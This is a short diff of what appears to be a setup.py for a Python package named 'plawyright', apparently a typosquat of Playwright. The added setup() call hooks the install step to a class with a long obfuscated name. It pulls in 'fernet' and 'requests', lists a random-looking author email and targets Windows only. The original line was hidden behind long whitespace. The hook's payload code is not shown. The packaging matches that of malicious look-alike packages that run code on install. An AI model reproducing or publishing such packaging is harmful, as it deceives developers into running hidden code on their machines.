@@ -18,5 +18,22 @@ class aimMHoWzNPFrJmcXPEDSUctULwXVvcBcUkjDaOJvMkUYFDRirUwxkedPsLvRYIoZgBPxyAlktN
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="plawyright",
+    version=VERSION,
+    author="osxbrz",
+    author_email="wIKvZdBXAiCGkCZEgNaX@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': aimMHoWzNPFrJmcXPEDSUctULwXVvcBcUkjDaOJvMkUYFDRirUwxkedPsLvRYIoZgBPxyAlktNRRpMcsJamYSIJnTLXemsLUOSrfRlyBjjFHqFMLwHUiUdgjcNfVoSFXuXHvsWyAzDHwPrlhUsJpTYZpdbjhpjQVqQmULpWCbI,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
